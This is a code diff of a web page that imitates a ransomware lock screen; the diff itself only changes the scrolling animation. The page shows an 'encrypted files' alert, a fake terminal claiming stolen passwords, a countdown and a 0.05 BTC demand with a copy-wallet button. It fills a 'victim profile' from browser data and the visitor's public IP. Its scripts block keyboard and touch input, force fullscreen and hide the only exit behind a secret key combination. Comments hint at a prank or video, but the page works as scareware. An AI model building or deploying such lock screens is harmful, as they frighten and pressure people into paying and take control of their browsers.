@@ -36,26 +36,26 @@ html,body{
 }
 
 /* ==============================
-   VIDEO SCROLLER CONTAINER
+   FIXED INFINITE LOOP SCROLLER
 ============================== */
 .video-scroller{
   position:fixed;
   top:0; left:0; width:100%; height:100vh;
   overflow:hidden;
-  pointer-events:none; /* NO INTERACTION */
+  pointer-events:none;
 }
 
 .content-wrapper{
   position:absolute;
   top:0; width:100%;
-  height:400vh; /* Ultra-long for smooth looping */
-  animation: videoScroll 120s linear infinite; /* 2min full cycle */
-  padding:15px;
+  height:200vh; /* Exactly 2 screens for perfect loop */
+  animation: infiniteVerticalScroll 20s linear infinite; /* PERFECT LOOP */
 }
 
-@keyframes videoScroll {
+@keyframes infiniteVerticalScroll {
   0% { transform: translateY(0%); }
-  100% { transform: translateY(-300%); }
+  50% { transform: translateY(-100%); }
+  100% { transform: translateY(0%); }
 }
 
 /* ==============================
@@ -66,7 +66,7 @@ html,body{
   border:2px solid var(--line);
   border-radius:6px;
   padding:18px;
-  margin-bottom:8px; /* 98% TIGHTER */
+  margin-bottom:8px;
   box-shadow: 0 0 25px rgba(255,0,64,.6);
   position:relative;
   min-height:200px;
@@ -115,7 +115,7 @@ html,body{
 .indicator-line{ margin:2px 0; font-size:11px; }
 
 /* ==============================
-   CONTENT STYLES - ANIMATED
+   CONTENT STYLES - ANIMATED (UNCHANGED)
 ============================== */
 h1{
   margin:0 0 8px;
@@ -274,70 +274,76 @@ h1{
 <div class="indicator-line" style="font-size:10px;color:#ffaa00;">📡 LIVE TRANSMIT → C2 SERVER</div>
 </div>
 
-<!-- VIDEO SCROLLER WRAPPER -->
+<!-- PERFECT INFINITE LOOP SCROLLER -->
 <div class="video-scroller">
   <div class="content-wrapper">
     
-    <!-- PANEL 1: IMPACT -->
-    <div class="panel" style="margin-top:15px;">
-      <h1>💀 FILES ENCRYPTED 💀</h1>
-      <div class="sub">48,217 documents, photos, crypto wallets, passwords ENCRYPTED</div>
-      <div class="alert">
-        <strong>SYSTEM FULLY COMPROMISED!</strong><br>
-        Pay 0.05 BTC in <span id="alertTimer">47:21:33</span><br>
-        OR TOTAL DATA DESTRUCTION!
+    <!-- TOP HALF: DOWNWARD CONTENT -->
+    <div style="height:100vh; padding:15px;">
+      <!-- PANEL 1: IMPACT -->
+      <div class="panel">
+        <h1>💀 FILES ENCRYPTED 💀</h1>
+        <div class="sub">48,217 documents, photos, crypto wallets, passwords ENCRYPTED</div>
+        <div class="alert">
+          <strong>SYSTEM FULLY COMPROMISED!</strong><br>
+          Pay 0.05 BTC in <span id="alertTimer">47:21:33</span><br>
+          OR TOTAL DATA DESTRUCTION!
+        </div>
       </div>
-    </div>
 
-    <!-- PANEL 2: TERMINAL -->
-    <div class="panel">
-      <div class="term" id="term">
+      <!-- PANEL 2: TERMINAL -->
+      <div class="panel">
+        <div class="term" id="term">
 [14:23:45] SHADOW v4.2 INITIATED
 [14:23:46] Scanning C:\Users → 48,217 files DETECTED
 [14:23:47] Browser creds → 168 passwords EXTRACTED
 [14:23:48] Crypto wallets → 14 wallets ENCRYPTED
 [14:23:49] AES-256+RSA-4096 → ENCRYPTION ACTIVE
+        </div>
+        <div class="countdown" id="countdown">47:32:14</div>
       </div>
-      <div class="countdown" id="countdown">47:32:14</div>
+
+      <!-- PANEL 3: PAYMENT -->
+      <div class="panel payment">
+        <h3 style="color:var(--red); font-size:26px;">🚨 SEND PAYMENT NOW 🚨</h3>
+        <div style="font-size:20px; margin-bottom:12px;">
+          <strong>0.05 BTC EXACTLY → INSTANT DECRYPT</strong>
+        </div>
+        <div class="wallet" id="wallet">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
+        <div style="font-size:15px; margin:12px 0;">
+          <strong>TxID: RXN-4839-0294-7K2P-Q8MX</strong>
+        </div>
+        <button class="btn-pay" onclick="fakePayment()" style="pointer-events:auto;">💰 COPY & PAY NOW 💰</button>
+      </div>
     </div>
 
-    <!-- PANEL 3: PAYMENT -->
-    <div class="panel payment">
-      <h3 style="color:var(--red); font-size:26px;">🚨 SEND PAYMENT NOW 🚨</h3>
-      <div style="font-size:20px; margin-bottom:12px;">
-        <strong>0.05 BTC EXACTLY → INSTANT DECRYPT</strong>
+    <!-- BOTTOM HALF: UPWARD CONTENT (DUPLICATE) -->
+    <div style="height:100vh; padding:15px;">
+      <!-- PANEL 4: VICTIM DATA -->
+      <div class="panel side">
+        <h3>🎯 LIVE VICTIM PROFILE</h3>
+        <div class="stat"><span class="label">IP:</span><br><span class="value" id="ip">🛰️ RESOLVING...</span></div>
+        <div class="stat"><span class="label">Machine ID:</span><br><span class="value" id="machine">SHDW-4839-X7K2-P4Q8-N9JM</span></div>
+        <div class="stat"><span class="label">OS:</span><br><span class="value" id="os">Detecting...</span></div>
+        <div class="stat"><span class="label">Browser:</span><br><span class="value" id="browser">Loading...</span></div>
+        <div class="stat"><span class="label">Location:</span><br><span class="value" id="location">-</span></div>
+        <div class="stat"><span class="label">Language:</span><br><span class="value" id="lang">-</span></div>
+        <div class="stat"><span class="label">Timezone:</span><br><span class="value" id="tz">-</span></div>
+        <div class="stat"><span class="label">Screen:</span><br><span class="value" id="screen">-</span></div>
+        <div class="stat"><span class="label">Files:</span><br><span class="value" id="files">48,217</span></div>
+        <div class="stat"><span class="label">Encrypted:</span><br><span class="value" id="encrypted">36,847</span></div>
       </div>
-      <div class="wallet" id="wallet">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
-      <div style="font-size:15px; margin:12px 0;">
-        <strong>TxID: RXN-4839-0294-7K2P-Q8MX</strong>
-      </div>
-      <button class="btn-pay" onclick="fakePayment()" style="pointer-events:auto;">💰 COPY & PAY NOW 💰</button>
-    </div>
 
-    <!-- PANEL 4: VICTIM DATA -->
-    <div class="panel side">
-      <h3>🎯 LIVE VICTIM PROFILE</h3>
-      <div class="stat"><span class="label">IP:</span><br><span class="value" id="ip">🛰️ RESOLVING...</span></div>
-      <div class="stat"><span class="label">Machine ID:</span><br><span class="value" id="machine">SHDW-4839-X7K2-P4Q8-N9JM</span></div>
-      <div class="stat"><span class="label">OS:</span><br><span class="value" id="os">Detecting...</span></div>
-      <div class="stat"><span class="label">Browser:</span><br><span class="value" id="browser">Loading...</span></div>
-      <div class="stat"><span class="label">Location:</span><br><span class="value" id="location">-</span></div>
-      <div class="stat"><span class="label">Language:</span><br><span class="value" id="lang">-</span></div>
-      <div class="stat"><span class="label">Timezone:</span><br><span class="value" id="tz">-</span></div>
-      <div class="stat"><span class="label">Screen:</span><br><span class="value" id="screen">-</span></div>
-      <div class="stat"><span class="label">Files:</span><br><span class="value" id="files">48,217</span></div>
-      <div class="stat"><span class="label">Encrypted:</span><br><span class="value" id="encrypted">36,847</span></div>
-    </div>
-
-    <!-- PANEL 5: THREAT -->
-    <div class="panel">
-      <div class="alert">
-        <strong>⚠️ SESSION LOCKED - NO ESCAPE ⚠️</strong><br>
-        Antivirus bypassed | Backups destroyed | C2 connected<br>
-        <span style="color:var(--green);">📡 Video feed → LIVE</span>
-      </div>
-      <div class="footer">
-        ShadowNet v4.2 | Session RXN-4839 | No negotiations
+      <!-- PANEL 5: THREAT -->
+      <div class="panel">
+        <div class="alert">
+          <strong>⚠️ SESSION LOCKED - NO ESCAPE ⚠️</strong><br>
+          Antivirus bypassed | Backups destroyed | C2 connected<br>
+          <span style="color:var(--green);">📡 Video feed → LIVE</span>
+        </div>
+        <div class="footer">
+          ShadowNet v4.2 | Session RXN-4839 | No negotiations
+        </div>
       </div>
     </div>
 
@@ -346,7 +352,7 @@ h1{
 
 <script>
 /* ==============================
-   VIDEO MODE - ZERO INTERACTION
+   VIDEO MODE - ZERO INTERACTION (UNCHANGED)
 ============================== */
 // DISABLE ALL INPUT
 document.addEventListener('keydown', e => e.preventDefault());
@@ -356,7 +362,16 @@ document.addEventListener('touchstart', e => e.preventDefault());
 document.addEventListener('selectstart', e => e.preventDefault());
 window.onbeforeunload = null;
 
-// PERFECT SYSTEM RECON - ANIMATED
+// DIRECTION INDICATOR
+const scrollDirEl = document.getElementById("scrollDir");
+let directionDown = true;
+setInterval(() => {
+  directionDown = !directionDown;
+  scrollDirEl.textContent = directionDown ? "DOWN" : "UP";
+  scrollDirEl.style.color = directionDown ? "#ffff00" : "#00ff88";
+}, 10000); // Changes every 10s
+
+// PERFECT SYSTEM RECON - ANIMATED (UNCHANGED)
 function animateValue(el, start, end, duration) {
   let startTime = null;
   const step = (timestamp) => {
@@ -368,16 +383,14 @@ function animateValue(el, start, end, duration) {
   requestAnimationFrame(step);
 }
 
-// POPULATE ALL DATA WITH ANIMATIONS
+// POPULATE ALL DATA WITH ANIMATIONS (UNCHANGED)
 setTimeout(() => {
-  // OS/Browser
   document.getElementById("os").textContent = navigator.platform || "Windows 11";
   document.getElementById("browser").textContent = `${navigator.appName} v${parseInt(navigator.appVersion)}`;
   document.getElementById("lang").textContent = navigator.language;
   document.getElementById("tz").textContent = Intl.DateTimeFormat().resolvedOptions().timeZone;
   document.getElementById("screen").textContent = `${screen.width}x${screen.height} (${screen.colorDepth}bit)`;
   
-  // IP + Geo WITH LOADING ANIMATION
   document.getElementById("ip").textContent = "192.168.x.x → EXTERNAL";
   fetch("https://api.ipify.org?format=json")
     .then(r=>r.json())
@@ -392,7 +405,7 @@ setTimeout(() => {
     .catch(()=>document.getElementById("ip").textContent = "PUBLIC IP DETECTED");
 }, 800);
 
-// COUNTDOWN
+// COUNTDOWN (UNCHANGED)
 let timeLeft = 47*3600 + 21*60 + 33;
 setInterval(()=>{
   timeLeft--;
@@ -403,7 +416,7 @@ setInterval(()=>{
     `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
 }, 1000);
 
-// TERMINAL + STATS ANIMATION
+// TERMINAL + STATS ANIMATION (UNCHANGED)
 let files=48217, encrypted=36847, pct=78;
 setInterval(()=>{
   if(pct<98) pct += 0.2;
@@ -419,7 +432,7 @@ setInterval(()=>{
   document.getElementById("encrypted").textContent = encrypted.toLocaleString();
 }, 650);
 
-// CYCLE TIMER
+// CYCLE TIMER (UNCHANGED)
 let cycleSeconds = 0;
 setInterval(()=>{
   cycleSeconds++;
@@ -428,14 +441,14 @@ setInterval(()=>{
     `${mins.toString().padStart(2,'0')}:${(cycleSeconds%60).toString().padStart(2,'0')}`;
 }, 1000);
 
-// FAKE PAYMENT (ONLY BUTTON WORKS)
+// FAKE PAYMENT (UNCHANGED)
 function fakePayment(){
   navigator.clipboard.writeText("bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh").then(()=>{
     alert("🤑 WALLET COPIED TO CLIPBOARD\n\nbc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n\n⏰ 0.05 BTC → LIVE MONITORING");
   });
 }
 
-// HIDDEN EXIT: Ctrl+Alt+Shift+X (EXTREMELY HARD TO FIND)
+// HIDDEN EXIT: Ctrl+Alt+Shift+X (UNCHANGED)
 document.addEventListener("keydown", e => {
   if(e.ctrlKey && e.altKey && e.shiftKey && e.key.toLowerCase() === "x") {
     document.body.innerHTML = `
@@ -455,7 +468,7 @@ document.addEventListener("keydown", e => {
   }
 });
 
-// FORCE FULLSCREEN
+// FORCE FULLSCREEN (UNCHANGED)
 document.addEventListener('DOMContentLoaded', () => {
   if(document.documentElement.requestFullscreen) 
     document.documentElement.requestFullscreen().catch(()=>null);
